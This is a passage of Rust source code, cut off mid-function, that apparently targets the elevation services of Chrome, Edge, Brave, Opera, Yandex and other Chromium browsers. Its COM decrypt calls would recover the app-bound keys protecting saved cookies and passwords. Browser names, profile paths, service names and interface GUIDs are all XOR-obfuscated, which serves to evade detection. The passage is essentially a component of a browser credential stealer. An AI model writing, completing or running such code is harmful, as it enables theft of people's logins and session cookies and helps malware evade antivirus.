#![allow(non_snake_case, non_camel_case_types)]

use std::ffi::c_void;
use std::sync::OnceLock;

const XOR_KEY: u8 = 0xAA;
const STR_XOR_KEY: u8 = 0x5A;

fn xor_str(data: &[u8]) -> String {
    String::from_utf8(data.iter().map(|&b| b ^ STR_XOR_KEY).collect()).unwrap_or_default()
}

fn s_chrome() -> String { xor_str(&[0x19, 0x32, 0x28, 0x35, 0x37, 0x3F]) }
fn s_chrome_beta() -> String { xor_str(&[0x19, 0x32, 0x28, 0x35, 0x37, 0x3F, 0x7A, 0x18, 0x3F, 0x2E, 0x3B]) }
fn s_chrome_dev() -> String { xor_str(&[0x19, 0x32, 0x28, 0x35, 0x37, 0x3F, 0x7A, 0x1E, 0x3F, 0x2C]) }
fn s_chrome_canary() -> String { xor_str(&[0x19, 0x32, 0x28, 0x35, 0x37, 0x3F, 0x7A, 0x19, 0x3B, 0x34, 0x3B, 0x28, 0x23]) }
fn s_brave() -> String { xor_str(&[0x18, 0x28, 0x3B, 0x2C, 0x3F]) }
fn s_edge() -> String { xor_str(&[0x1F, 0x3E, 0x3D, 0x3F]) }
fn s_vivaldi() -> String { xor_str(&[0x0C, 0x33, 0x2C, 0x3B, 0x36, 0x3E, 0x33]) }
fn s_opera() -> String { xor_str(&[0x15, 0x2A, 0x3F, 0x28, 0x3B]) }
fn s_yandex() -> String { xor_str(&[0x03, 0x3B, 0x34, 0x3E, 0x3F, 0x22]) }
fn s_chromium() -> String { xor_str(&[0x19, 0x32, 0x28, 0x35, 0x37, 0x33, 0x2F, 0x37]) }

fn s_google_chrome_user_data() -> String {
    xor_str(&[0x1D, 0x35, 0x35, 0x3D, 0x36, 0x3F, 0x06, 0x19, 0x32, 0x28, 0x35, 0x37, 0x3F, 0x06, 0x0F, 0x29, 0x3F, 0x28, 0x7A, 0x1E, 0x3B, 0x2E, 0x3B])
}
fn s_google_chrome_beta_user_data() -> String {
    xor_str(&[0x1D, 0x35, 0x35, 0x3D, 0x36, 0x3F, 0x06, 0x19, 0x32, 0x28, 0x35, 0x37, 0x3F, 0x7A, 0x18, 0x3F, 0x2E, 0x3B, 0x06, 0x0F, 0x29, 0x3F, 0x28, 0x7A, 0x1E, 0x3B, 0x2E, 0x3B])
}
fn s_google_chrome_dev_user_data() -> String {
    xor_str(&[0x1D, 0x35, 0x35, 0x3D, 0x36, 0x3F, 0x06, 0x19, 0x32, 0x28, 0x35, 0x37, 0x3F, 0x7A, 0x1E, 0x3F, 0x2C, 0x06, 0x0F, 0x29, 0x3F, 0x28, 0x7A, 0x1E, 0x3B, 0x2E, 0x3B])
}
fn s_google_chrome_sxs_user_data() -> String {
    xor_str(&[0x1D, 0x35, 0x35, 0x3D, 0x36, 0x3F, 0x06, 0x19, 0x32, 0x28, 0x35, 0x37, 0x3F, 0x7A, 0x09, 0x22, 0x09, 0x06, 0x0F, 0x29, 0x3F, 0x28, 0x7A, 0x1E, 0x3B, 0x2E, 0x3B])
}
fn s_brave_user_data() -> String {
    xor_str(&[0x18, 0x28, 0x3B, 0x2C, 0x3F, 0x09, 0x35, 0x3C, 0x2E, 0x2D, 0x3B, 0x28, 0x3F, 0x06, 0x18, 0x28, 0x3B, 0x2C, 0x3F, 0x77, 0x18, 0x28, 0x35, 0x2D, 0x29, 0x3F, 0x28, 0x06, 0x0F, 0x29, 0x3F, 0x28, 0x7A, 0x1E, 0x3B, 0x2E, 0x3B])
}
fn s_edge_user_data() -> String {
    xor_str(&[0x17, 0x33, 0x39, 0x28, 0x35, 0x29, 0x35, 0x3C, 0x2E, 0x06, 0x1F, 0x3E, 0x3D, 0x3F, 0x06, 0x0F, 0x29, 0x3F, 0x28, 0x7A, 0x1E, 0x3B, 0x2E, 0x3B])
}
fn s_vivaldi_user_data() -> String {
    xor_str(&[0x0C, 0x33, 0x2C, 0x3B, 0x36, 0x3E, 0x33, 0x06, 0x0F, 0x29, 0x3F, 0x28, 0x7A, 0x1E, 0x3B, 0x2E, 0x3B])
}
fn s_opera_user_data() -> String {
    xor_str(&[0x15, 0x2A, 0x3F, 0x28, 0x3B, 0x7A, 0x09, 0x35, 0x3C, 0x2E, 0x2D, 0x3B, 0x28, 0x3F, 0x06, 0x15, 0x2A, 0x3F, 0x28, 0x3B, 0x7A, 0x09, 0x2E, 0x3B, 0x38, 0x36, 0x3F])
}
fn s_yandex_user_data() -> String {
    xor_str(&[0x03, 0x3B, 0x34, 0x3E, 0x3F, 0x22, 0x06, 0x03, 0x3B, 0x34, 0x3E, 0x3F, 0x22, 0x18, 0x28, 0x35, 0x2D, 0x29, 0x3F, 0x28, 0x06, 0x0F, 0x29, 0x3F, 0x28, 0x7A, 0x1E, 0x3B, 0x2E, 0x3B])
}
fn s_chromium_user_data() -> String {
    xor_str(&[0x19, 0x32, 0x28, 0x35, 0x37, 0x33, 0x2F, 0x37, 0x06, 0x0F, 0x29, 0x3F, 0x28, 0x7A, 0x1E, 0x3B, 0x2E, 0x3B])
}

fn s_google_chrome_elevation() -> String {
    xor_str(&[0x1D, 0x35, 0x35, 0x3D, 0x36, 0x3F, 0x19, 0x32, 0x28, 0x35, 0x37, 0x3F, 0x1F, 0x36, 0x3F, 0x2C, 0x3B, 0x2E, 0x33, 0x35, 0x34, 0x09, 0x3F, 0x28, 0x2C, 0x33, 0x39, 0x3F])
}
fn s_google_chrome_beta_elevation() -> String {
    xor_str(&[0x1D, 0x35, 0x35, 0x3D, 0x36, 0x3F, 0x19, 0x32, 0x28, 0x35, 0x37, 0x3F, 0x18, 0x3F, 0x2E, 0x3B, 0x1F, 0x36, 0x3F, 0x2C, 0x3B, 0x2E, 0x33, 0x35, 0x34, 0x09, 0x3F, 0x28, 0x2C, 0x33, 0x39, 0x3F])
}
fn s_google_chrome_dev_elevation() -> String {
    xor_str(&[0x1D, 0x35, 0x35, 0x3D, 0x36, 0x3F, 0x19, 0x32, 0x28, 0x35, 0x37, 0x3F, 0x1E, 0x3F, 0x2C, 0x1F, 0x36, 0x3F, 0x2C, 0x3B, 0x2E, 0x33, 0x35, 0x34, 0x09, 0x3F, 0x28, 0x2C, 0x33, 0x39, 0x3F])
}
fn s_google_chrome_canary_elevation() -> String {
    xor_str(&[0x1D, 0x35, 0x35, 0x3D, 0x36, 0x3F, 0x19, 0x32, 0x28, 0x35, 0x37, 0x3F, 0x19, 0x3B, 0x34, 0x3B, 0x28, 0x23, 0x1F, 0x36, 0x3F, 0x2C, 0x3B, 0x2E, 0x33, 0x35, 0x34, 0x09, 0x3F, 0x28, 0x2C, 0x33, 0x39, 0x3F])
}
fn s_brave_elevation() -> String { xor_str(&[0x18, 0x28, 0x3B, 0x2C, 0x3F, 0x1F, 0x36, 0x3F, 0x2C, 0x3B, 0x2E, 0x33, 0x35, 0x34, 0x09, 0x3F, 0x28, 0x2C, 0x33, 0x39, 0x3F]) }
fn s_edge_elevation() -> String {
    xor_str(&[0x17, 0x33, 0x39, 0x28, 0x35, 0x29, 0x35, 0x3C, 0x2E, 0x1F, 0x3E, 0x3D, 0x3F, 0x1F, 0x36, 0x3F, 0x2C, 0x3B, 0x2E, 0x33, 0x35, 0x34, 0x09, 0x3F, 0x28, 0x2C, 0x33, 0x39, 0x3F])
}
fn s_vivaldi_elevation() -> String {
    xor_str(&[0x0C, 0x33, 0x2C, 0x3B, 0x36, 0x3E, 0x33, 0x1F, 0x36, 0x3F, 0x2C, 0x3B, 0x2E, 0x33, 0x35, 0x34, 0x09, 0x3F, 0x28, 0x2C, 0x33, 0x39, 0x3F])
}
fn s_opera_elevation() -> String {
    xor_str(&[0x15, 0x2A, 0x3F, 0x28, 0x3B, 0x1F, 0x36, 0x3F, 0x2C, 0x3B, 0x2E, 0x33, 0x35, 0x34, 0x09, 0x3F, 0x28, 0x2C, 0x33, 0x39, 0x3F])
}
fn s_yandex_elevation() -> String {
    xor_str(&[0x03, 0x3B, 0x34, 0x3E, 0x3F, 0x22, 0x18, 0x28, 0x35, 0x2D, 0x29, 0x3F, 0x28, 0x1F, 0x36, 0x3F, 0x2C, 0x3B, 0x2E, 0x33, 0x35, 0x34, 0x09, 0x3F, 0x28, 0x2C, 0x33, 0x39, 0x3F])
}
fn s_chromium_elevation() -> String {
    xor_str(&[0x19, 0x32, 0x28, 0x35, 0x37, 0x33, 0x2F, 0x37, 0x1F, 0x36, 0x3F, 0x2C, 0x3B, 0x2E, 0x33, 0x35, 0x34, 0x09, 0x3F, 0x28, 0x2C, 0x33, 0x39, 0x3F])
}

fn xor_guid(data: &[u8]) -> GUID {
    let bytes: Vec<u8> = data.iter().map(|&b| b ^ XOR_KEY).collect();
    let data1 = u32::from_le_bytes([bytes[0], bytes[1], bytes[2], bytes[3]]);
    let data2 = u16::from_le_bytes([bytes[4], bytes[5]]);
    let data3 = u16::from_le_bytes([bytes[6], bytes[7]]);
    let mut data4 = [0u8; 8];
    data4.copy_from_slice(&bytes[8..16]);
    GUID { data1, data2, data3, data4 }
}

// ============ GUIDs obfusqués (XOR bytes) ============

// IID_ELEVATOR2 : 8F7B6792-784D-4047-845D-1782EFBEF205
const IID_ELEVATOR2_XOR: &[u8] = &[
    0x25, 0xD1, 0xCD, 0x38, 0xD2, 0xE7, 0xEA, 0x0D, 0x2E, 0xFF, 0xBD, 0x22, 0x9A, 0x68, 0x54, 0xAF,
];
// IID_ELEVATOR2_CHROMIUM : BB19A0E5-00C6-4966-94B2-5AFEC6FED93A
const IID_ELEVATOR2_CHROMIUM_XOR: &[u8] = &[
    0x11, 0xB3, 0xA1, 0x4F, 0xAA, 0x6C, 0xE3, 0xCC, 0x3E, 0x18, 0xF0, 0x54, 0x58, 0x64, 0x6C, 0x90,
];
// IID_ELEVATOR : A949CB4E-C4F9-44C4-B213-6BF8AA9AC69C
const IID_ELEVATOR_XOR: &[u8] = &[
    0x03, 0xE3, 0x61, 0x24, 0x6E, 0x53, 0xE6, 0x6E, 0x18, 0xB9, 0xC1, 0x00, 0x43, 0x52, 0x30, 0x36,
];
// IID_ELEVATOR_CHROMIUM : B88C45B9-8825-4629-B38E-77CC67D9CEED
const IID_ELEVATOR_CHROMIUM_XOR: &[u8] = &[
    0x12, 0x26, 0xEF, 0x13, 0x22, 0x8F, 0xEC, 0x83, 0x19, 0x24, 0x65, 0x6D, 0xDD, 0x56, 0x4C, 0x47,
];
// IID_ELEVATOR2_CHROME : 1BF5208B-295F-4992-B5F4-3A9BB6494838
const IID_ELEVATOR2_CHROME_XOR: &[u8] = &[
    0x81, 0x5F, 0x7F, 0x21, 0x83, 0xF5, 0xE3, 0x38, 0x1F, 0x5E, 0x90, 0x31, 0x29, 0x11, 0xE2, 0x92,
];
// IID_ELEVATOR_CHROME : 463ABECF-410D-407F-8AF5-0DF35A005CC8
const IID_ELEVATOR_CHROME_XOR: &[u8] = &[
    0xEC, 0x90, 0xB0, 0x6C, 0xEB, 0xA7, 0xEA, 0xD5, 0x20, 0x5F, 0xB3, 0x59, 0xA7, 0x59, 0xF6, 0x62,
];
// IID_ELEVATOR2_CHROME_BETA : B96A14B8-D0B0-44D8-BA68-2385B2A03254
const IID_ELEVATOR2_CHROME_BETA_XOR: &[u8] = &[
    0x12, 0xC0, 0xBE, 0x12, 0x7A, 0x1A, 0xEE, 0x72, 0x10, 0xC2, 0x82, 0x89, 0x8B, 0x2F, 0x0A, 0xFE,
];
// IID_ELEVATOR_CHROME_BETA : A2721D66-376E-4D2F-9F0F-9070E9A42B5F
const IID_ELEVATOR_CHROME_BETA_XOR: &[u8] = &[
    0x08, 0xD8, 0xB7, 0x28, 0xDD, 0xC4, 0xE7, 0x85, 0x35, 0xA5, 0xFA, 0x3A, 0xDA, 0x43, 0x81, 0xF5,
];
// IID_ELEVATOR2_CHROME_DEV : 3FEFA48E-C8BF-461F-AED6-63F658CC850A
const IID_ELEVATOR2_CHROME_DEV_XOR: &[u8] = &[
    0x95, 0x45, 0x4E, 0x24, 0x62, 0x15, 0xEC, 0xB5, 0x04, 0x7C, 0x9C, 0x4A, 0xC9, 0x5C, 0x2F, 0xA0,
];
// IID_ELEVATOR_CHROME_DEV : BB2AA26B-343A-4072-8B6F-80557B8CE571
const IID_ELEVATOR_CHROME_DEV_XOR: &[u8] = &[
    0x11, 0x80, 0x08, 0xC1, 0x9E, 0x90, 0xEA, 0xD8, 0x21, 0xC5, 0xDF, 0x0F, 0x2A, 0xD1, 0x6E, 0xDB,
];
// IID_ELEVATOR2_CHROME_CANARY : FF672E9F-0994-4322-81E5-3A5A9746140A
const IID_ELEVATOR2_CHROME_CANARY_XOR: &[u8] = &[
    0x55, 0xCD, 0x84, 0x35, 0xA3, 0x3E, 0xE9, 0x88, 0x2B, 0x4F, 0x90, 0x3D, 0x90, 0xF0, 0xBE, 0xA0,
];
// IID_ELEVATOR_CHROME_CANARY : 4F7CE041-28E9-484F-9DD0-61A8CACEFEE4
const IID_ELEVATOR_CHROME_CANARY_XOR: &[u8] = &[
    0xE5, 0xD6, 0x6A, 0x6B, 0x82, 0x43, 0xE2, 0xE5, 0x37, 0x7A, 0x0B, 0x02, 0xCB, 0x62, 0x54, 0x4E,
];
// IID_ELEVATOR_BRAVE : F396861E-0C8E-4C71-8256-2FAE6D759C9E
const IID_ELEVATOR_BRAVE_XOR: &[u8] = &[
    0x59, 0x3C, 0x2C, 0x7C, 0xA6, 0x24, 0xE6, 0xDB, 0x28, 0xFC, 0x85, 0x04, 0x05, 0xDE, 0xF6, 0x34,
];
// IID_ELEVATOR_BRAVE_BASE : 5A9A9462-2FA1-4FEB-B7F2-DF3D19134463
const IID_ELEVATOR_BRAVE_BASE_XOR: &[u8] = &[
    0xF0, 0x30, 0x3E, 0xC8, 0x85, 0x0B, 0xE5, 0x41, 0x1D, 0x58, 0x97, 0x77, 0x75, 0xB7, 0xED, 0xC9,
];
// IID_ELEVATOR_EDGE : C9C2B807-7731-4F34-81B7-44FF7779522B
const IID_ELEVATOR_EDGE_XOR: &[u8] = &[
    0x63, 0x68, 0x68, 0xAD, 0xDD, 0x9B, 0xE5, 0x9E, 0x2B, 0x1D, 0x55, 0xDD, 0xE4, 0x55, 0xC3, 0x81,
];

// ============ Helpers to get GUIDs at runtime ============
fn get_iid_elevator2() -> GUID { xor_guid(IID_ELEVATOR2_XOR) }
fn get_iid_elevator2_chromium() -> GUID { xor_guid(IID_ELEVATOR2_CHROMIUM_XOR) }
fn get_iid_elevator() -> GUID { xor_guid(IID_ELEVATOR_XOR) }
fn get_iid_elevator_chromium() -> GUID { xor_guid(IID_ELEVATOR_CHROMIUM_XOR) }
fn get_iid_elevator2_chrome() -> GUID { xor_guid(IID_ELEVATOR2_CHROME_XOR) }
fn get_iid_elevator_chrome() -> GUID { xor_guid(IID_ELEVATOR_CHROME_XOR) }
fn get_iid_elevator2_chrome_beta() -> GUID { xor_guid(IID_ELEVATOR2_CHROME_BETA_XOR) }
fn get_iid_elevator_chrome_beta() -> GUID { xor_guid(IID_ELEVATOR_CHROME_BETA_XOR) }
fn get_iid_elevator2_chrome_dev() -> GUID { xor_guid(IID_ELEVATOR2_CHROME_DEV_XOR) }
fn get_iid_elevator_chrome_dev() -> GUID { xor_guid(IID_ELEVATOR_CHROME_DEV_XOR) }
fn get_iid_elevator2_chrome_canary() -> GUID { xor_guid(IID_ELEVATOR2_CHROME_CANARY_XOR) }
fn get_iid_elevator_chrome_canary() -> GUID { xor_guid(IID_ELEVATOR_CHROME_CANARY_XOR) }
fn get_iid_elevator_brave() -> GUID { xor_guid(IID_ELEVATOR_BRAVE_XOR) }
fn get_iid_elevator_brave_base() -> GUID { xor_guid(IID_ELEVATOR_BRAVE_BASE_XOR) }
fn get_iid_elevator_edge() -> GUID { xor_guid(IID_ELEVATOR_EDGE_XOR) }

// ============ IID lists as static slices (initialized lazily) ============
fn chrome_iids() -> &'static [GUID] {
    static LIST: OnceLock<Vec<GUID>> = OnceLock::new();
    LIST.get_or_init(|| {
        vec![
            get_iid_elevator2_chrome(),
            get_iid_elevator2_chromium(),
            get_iid_elevator2(),
            get_iid_elevator_chrome(),
            get_iid_elevator_chromium(),
            get_iid_elevator(),
        ]
    })
    .as_slice()
}

fn chrome_beta_iids() -> &'static [GUID] {
    static LIST: OnceLock<Vec<GUID>> = OnceLock::new();
    LIST.get_or_init(|| {
        vec![
            get_iid_elevator2_chrome_beta(),
            get_iid_elevator2_chromium(),
            get_iid_elevator2(),
            get_iid_elevator_chrome_beta(),
            get_iid_elevator_chromium(),
            get_iid_elevator(),
        ]
    })
    .as_slice()
}

fn chrome_dev_iids() -> &'static [GUID] {
    static LIST: OnceLock<Vec<GUID>> = OnceLock::new();
    LIST.get_or_init(|| {
        vec![
            get_iid_elevator2_chrome_dev(),
            get_iid_elevator2_chromium(),
            get_iid_elevator2(),
            get_iid_elevator_chrome_dev(),
            get_iid_elevator_chromium(),
            get_iid_elevator(),
        ]
    })
    .as_slice()
}

fn chrome_canary_iids() -> &'static [GUID] {
    static LIST: OnceLock<Vec<GUID>> = OnceLock::new();
    LIST.get_or_init(|| {
        vec![
            get_iid_elevator2_chrome_canary(),
            get_iid_elevator2_chromium(),
            get_iid_elevator2(),
            get_iid_elevator_chrome_canary(),
            get_iid_elevator_chromium(),
            get_iid_elevator(),
        ]
    })
    .as_slice()
}

fn brave_iids() -> &'static [GUID] {
    static LIST: OnceLock<Vec<GUID>> = OnceLock::new();
    LIST.get_or_init(|| {
        vec![
            get_iid_elevator2_chrome(),
            get_iid_elevator2_chromium(),
            get_iid_elevator2(),
            get_iid_elevator_brave(),
            get_iid_elevator_brave_base(),
            get_iid_elevator_chromium(),
        ]
    })
    .as_slice()
}

fn edge_iids() -> &'static [GUID] {
    static LIST: OnceLock<Vec<GUID>> = OnceLock::new();
    LIST.get_or_init(|| {
        vec![
            get_iid_elevator2(),
            get_iid_elevator_edge(),
            get_iid_elevator(),
        ]
    })
    .as_slice()
}

fn generic_chromium_iids() -> &'static [GUID] {
    static LIST: OnceLock<Vec<GUID>> = OnceLock::new();
    LIST.get_or_init(|| {
        vec![
            get_iid_elevator2_chromium(),
            get_iid_elevator2(),
            get_iid_elevator_chromium(),
            get_iid_elevator(),
            get_iid_elevator2_chrome(),
            get_iid_elevator_chrome(),
        ]
    })
    .as_slice()
}

// ============ GUID struct and const helpers (unchanged) ============
#[repr(C)]
#[derive(Clone, Copy, Debug)]
pub struct GUID {
    data1: u32,
    data2: u16,
    data3: u16,
    data4: [u8; 8],
}

// Helper to create a GUID from components (used for CLSIDs that we also obfuscate)
// We'll obfuscate CLSIDs as well.

// ============ Obfuscated CLSIDs ============
// CLSID for Chrome/Chromium : 708860E0-F641-4611-8895-7D867DD3675B
const CLSID_GENERIC_XOR: &[u8] = &[
    0xCA, 0x12, 0x21, 0x4A, 0x5C, 0xEB, 0xEC, 0xBB, 0x22, 0x3F, 0x7C, 0x77, 0x7C, 0x6D, 0x6D, 0xF1,
];
// CLSID for Chrome Beta : DD2646BA-3707-4BF8-B9A7-038691A68FC2
const CLSID_CHROME_BETA_XOR: &[u8] = &[
    0x77, 0x8C, 0xEC, 0x10, 0x9D, 0xAD, 0xE1, 0x52, 0x13, 0x0D, 0xA9, 0x3A, 0x2F, 0x23, 0x25, 0x68,
];
// CLSID for Chrome Dev : DA7FDCA5-2CAA-4637-AA17-0740584DE7DA
const CLSID_CHROME_DEV_XOR: &[u8] = &[
    0x70, 0xD5, 0xD6, 0x0F, 0x86, 0x00, 0xEC, 0x9D, 0x00, 0xBD, 0xAD, 0x6A, 0x81, 0xFA, 0xE7, 0x70,
];
// CLSID for Chrome Canary : 704C2872-2049-435E-A469-0A534313C42B
const CLSID_CHROME_CANARY_XOR: &[u8] = &[
    0xDA, 0xE6, 0x82, 0x8A, 0x8A, 0xE3, 0xE9, 0xF4, 0x0E, 0xC3, 0xF9, 0x2E, 0x60, 0xF9, 0xB9, 0x81,
];
// CLSID for Brave : 576B31AF-6369-4B6B-8560-E4B203A97A8B
const CLSID_BRAVE_XOR: &[u8] = &[
    0xFD, 0xC1, 0x9B, 0x05, 0xC9, 0xC3, 0xE1, 0xC1, 0x2F, 0xCA, 0x0E, 0x69, 0x03, 0x4A, 0xD0, 0x21,
];
// CLSID for Edge : 1FCBE96C-1697-43AF-9140-2897C7C69767
const CLSID_EDGE_XOR: &[u8] = &[
    0xB5, 0x61, 0x43, 0xC6, 0xBC, 0x3D, 0xE9, 0x05, 0x3B, 0xAA, 0x82, 0x3D, 0xCB, 0x6B, 0x3D, 0xCD,
];

fn get_clsid_generic() -> GUID { xor_guid(CLSID_GENERIC_XOR) }
fn get_clsid_chrome_beta() -> GUID { xor_guid(CLSID_CHROME_BETA_XOR) }
fn get_clsid_chrome_dev() -> GUID { xor_guid(CLSID_CHROME_DEV_XOR) }
fn get_clsid_chrome_canary() -> GUID { xor_guid(CLSID_CHROME_CANARY_XOR) }
fn get_clsid_brave() -> GUID { xor_guid(CLSID_BRAVE_XOR) }
fn get_clsid_edge() -> GUID { xor_guid(CLSID_EDGE_XOR) }

// ============ Browser configs ============
#[derive(Clone)]
pub struct BrowserCom {
    pub name: String,
    pub clsid: GUID,
    pub iids: &'static [GUID],
    pub user_data_rel: String,
    pub service_name: String,
}

// Because we can't have static BrowserCom with non-const fields, we'll use a function that returns a list of BrowserCom.
pub fn all_browsers() -> &'static [BrowserCom] {
    static BROWSERS: OnceLock<Vec<BrowserCom>> = OnceLock::new();
    BROWSERS.get_or_init(|| {
        vec![
            BrowserCom {
                name: s_chrome(),
                clsid: get_clsid_generic(),
                iids: chrome_iids(),
                user_data_rel: s_google_chrome_user_data(),
                service_name: s_google_chrome_elevation(),
            },
            BrowserCom {
                name: s_chrome_beta(),
                clsid: get_clsid_chrome_beta(),
                iids: chrome_beta_iids(),
                user_data_rel: s_google_chrome_beta_user_data(),
                service_name: s_google_chrome_beta_elevation(),
            },
            BrowserCom {
                name: s_chrome_dev(),
                clsid: get_clsid_chrome_dev(),
                iids: chrome_dev_iids(),
                user_data_rel: s_google_chrome_dev_user_data(),
                service_name: s_google_chrome_dev_elevation(),
            },
            BrowserCom {
                name: s_chrome_canary(),
                clsid: get_clsid_chrome_canary(),
                iids: chrome_canary_iids(),
                user_data_rel: s_google_chrome_sxs_user_data(),
                service_name: s_google_chrome_canary_elevation(),
            },
            BrowserCom {
                name: s_brave(),
                clsid: get_clsid_brave(),
                iids: brave_iids(),
                user_data_rel: s_brave_user_data(),
                service_name: s_brave_elevation(),
            },
            BrowserCom {
                name: s_edge(),
                clsid: get_clsid_edge(),
                iids: edge_iids(),
                user_data_rel: s_edge_user_data(),
                service_name: s_edge_elevation(),
            },
            BrowserCom {
                name: s_vivaldi(),
                clsid: get_clsid_generic(),
                iids: generic_chromium_iids(),
                user_data_rel: s_vivaldi_user_data(),
                service_name: s_vivaldi_elevation(),
            },
            BrowserCom {
                name: s_opera(),
                clsid: get_clsid_generic(),
                iids: generic_chromium_iids(),
                user_data_rel: s_opera_user_data(),
                service_name: s_opera_elevation(),
            },
            BrowserCom {
                name: s_yandex(),
                clsid: get_clsid_generic(),
                iids: generic_chromium_iids(),
                user_data_rel: s_yandex_user_data(),
                service_name: s_yandex_elevation(),
            },
        ]
    })
    .as_slice()
}

// The original `BROWSERS` static array is replaced by `all_browsers()`
// We also keep the `GENERIC_CHROMIUM` for fallback, but now we use a function.
pub fn generic_chromium() -> BrowserCom {
    BrowserCom {
        name: s_chromium(),
        clsid: get_clsid_generic(),
        iids: generic_chromium_iids(),
        user_data_rel: s_chromium_user_data(),
        service_name: s_chromium_elevation(),
    }
}

fn generic_chromium_ref() -> &'static BrowserCom {
    static ENTRY: OnceLock<BrowserCom> = OnceLock::new();
    ENTRY.get_or_init(generic_chromium)
}

/// Detect browser from executable path (unchanged, but uses all_browsers())
pub fn resolve_browser(exe_path: &str) -> Option<&'static BrowserCom> {
    let exe = exe_path.to_lowercase();

    if contains_enc(&exe, &[0x38, 0x28, 0x3B, 0x2C, 0x3F]) {
        return all_browsers().iter().find(|b| b.name == s_brave());
    }
    if contains_enc(&exe, &[0x37, 0x29, 0x3F, 0x3E, 0x3D, 0x3F])
        || (contains_enc(&exe, &[0x3F, 0x3E, 0x3D, 0x3F]) && !contains_enc(&exe, &[0x39, 0x32, 0x28, 0x35, 0x37, 0x3F]))
    {
        return all_browsers().iter().find(|b| b.name == s_edge());
    }
    if contains_enc(&exe, &[0x2C, 0x33, 0x2C, 0x3B, 0x36, 0x3E, 0x33]) {
        return all_browsers().iter().find(|b| b.name == s_vivaldi());
    }
    if contains_enc(&exe, &[0x35, 0x2A, 0x3F, 0x28, 0x3B]) {
        return all_browsers().iter().find(|b| b.name == s_opera());
    }
    if contains_enc(&exe, &[0x03, 0x3B, 0x34, 0x3E, 0x3F, 0x22]) {
        return all_browsers().iter().find(|b| b.name == s_yandex());
    }
    if contains_enc(&exe, &[0x39, 0x35, 0x39, 0x39, 0x35, 0x39])
        || contains_enc(&exe, &[0x69, 0x6C, 0x6A, 0x39, 0x32, 0x28, 0x35, 0x37, 0x3F])
        || contains_enc(&exe, &[0x3F, 0x2A, 0x33, 0x39])
        || contains_enc(&exe, &[0x2F, 0x28, 0x3B, 0x34])
        || contains_enc(&exe, &[0x6D, 0x29, 0x2E, 0x3B, 0x28])
        || contains_enc(&exe, &[0x2E, 0x35, 0x28, 0x39, 0x32])
        || contains_enc(&exe, &[0x31, 0x35, 0x37, 0x3F, 0x2E, 0x3B])
        || contains_enc(&exe, &[0x35, 0x28, 0x38, 0x33, 0x2E, 0x37, 0x37])
        || contains_enc(&exe, &[0x3B, 0x37, 0x33, 0x3D, 0x35])
        || contains_enc(&exe, &[0x29, 0x2A, 0x2F, 0x2E, 0x34, 0x33, 0x31])
        || contains_enc(&exe, &[0x29, 0x36, 0x33, 0x37, 0x30, 0x3F, 0x2E])
        || contains_enc(&exe, &[0x2E, 0x32, 0x35, 0x28, 0x33, 0x37, 0x37])
        || contains_enc(&exe, &[0x39, 0x3F, 0x34, 0x2E, 0x38, 0x28, 0x35, 0x3D, 0x29, 0x3F, 0x28])
        || contains_enc(&exe, &[0x06, 0x3B, 0x28, 0x39, 0x06])
    {
        return Some(generic_chromium_ref());
    }
    if contains_enc(&exe, &[0x39, 0x32, 0x28, 0x35, 0x37, 0x3F]) {
        if contains_enc(&exe, &[0x39, 0x32, 0x28, 0x35, 0x37, 0x3F, 0x7A, 0x29, 0x22, 0x29])
            || contains_enc(&exe, &[0x06, 0x29, 0x22, 0x29, 0x06])
        {
            return all_browsers().iter().find(|b| b.name == s_chrome_canary());
        }
        if contains_enc(&exe, &[0x39, 0x32, 0x28, 0x35, 0x37, 0x3F, 0x7A, 0x3E, 0x3F, 0x2C]) {
            return all_browsers().iter().find(|b| b.name == s_chrome_dev());
        }
        if contains_enc(&exe, &[0x39, 0x32, 0x28, 0x35, 0x37, 0x3F, 0x7A, 0x38, 0x3F, 0x2E, 0x3B]) {
            return all_browsers().iter().find(|b| b.name == s_chrome_beta());
        }
        if contains_enc(&exe, &[0x39, 0x32, 0x28, 0x35, 0x37, 0x33, 0x2F, 0x37])
            && !contains_enc(&exe, &[0x3D, 0x35, 0x35, 0x3D, 0x36, 0x3F])
        {
            return Some(generic_chromium_ref());
        }
        return all_browsers().iter().find(|b| b.name == s_chrome());
    }

    None
}

fn contains_enc(exe: &str, enc: &[u8]) -> bool {
    exe.contains(&xor_str(enc))
}

fn guid_to_string(g: &GUID) -> String {
    format!(
        "{{{:08X}-{:04X}-{:04X}-{:02X}{:02X}-{:02X}{:02X}{:02X}{:02X}{:02X}{:02X}}}",
        g.data1, g.data2, g.data3,
        g.data4[0], g.data4[1], g.data4[2], g.data4[3],
        g.data4[4], g.data4[5], g.data4[6], g.data4[7],
    )
}

// ============ Original COM code ============

#[link(name = "ole32")]
#[link(name = "oleaut32")]
extern "system" {
    fn CoInitializeEx(pv: *const c_void, co_init: u32) -> i32;
    fn CoUninitialize();
    fn CoCreateInstance(
        rclsid: *const GUID,
        punk_outer: *const c_void,
        ctx: u32,
        riid: *const GUID,
        ppv: *mut *mut c_void,
    ) -> i32;
    fn CoSetProxyBlanket(
        proxy: *mut c_void,
        authn: u32,
        authz: u32,
        princ: *const u16,
        authn_lvl: u32,
        imp_lvl: u32,
        auth_info: *const c_void,
        caps: u32,
    ) -> i32;
    fn SysAllocStringByteLen(psz: *const i8, len: u32) -> *mut u16;
    fn SysFreeString(bstr: *mut u16);
    fn SysStringByteLen(bstr: *const u16) -> u32;
}

type FnQI = unsafe extern "system" fn(*mut c_void, *const GUID, *mut *mut c_void) -> i32;
type FnRef = unsafe extern "system" fn(*mut c_void) -> u32;
type FnRun =
    unsafe extern "system" fn(*mut c_void, *const u16, *const u16, *const u16, *const u16, u32, *mut usize) -> i32;
type FnEnc = unsafe extern "system" fn(*mut c_void, u32, *mut u16, *mut *mut u16, *mut u32) -> i32;
type FnDec = unsafe extern "system" fn(*mut c_void, *mut u16, *mut *mut u16, *mut u32) -> i32;

#[repr(C)]
struct Vtbl {
    qi: FnQI,
    ar: FnRef,
    rel: FnRef,
    run: FnRun,
    enc: FnEnc,
    dec: FnDec,
}
#[repr(C)]
struct IElev {
    vtbl: *const Vtbl,
}

struct OwnedBstr(*mut u16);

impl OwnedBstr {
    unsafe fn from_bytes(data: &[u8]) -> Option<Self> {
        if data.is_empty() { return None; }
        let p = SysAllocStringByteLen(data.as_ptr() as *const i8, data.len() as u32);
        if p.is_null() { None } else { Some(OwnedBstr(p)) }
    }
    fn ptr(&self) -> *mut u16 { self.0 }
}
impl Drop for OwnedBstr {
    fn drop(&mut self) {
        if !self.0.is_null() {
            unsafe { SysFreeString(self.0); }
            self.0 = std::ptr::null_mut();
        }
    }
}

unsafe fn consume_bstr(p: *mut u16) -> Vec<u8> {
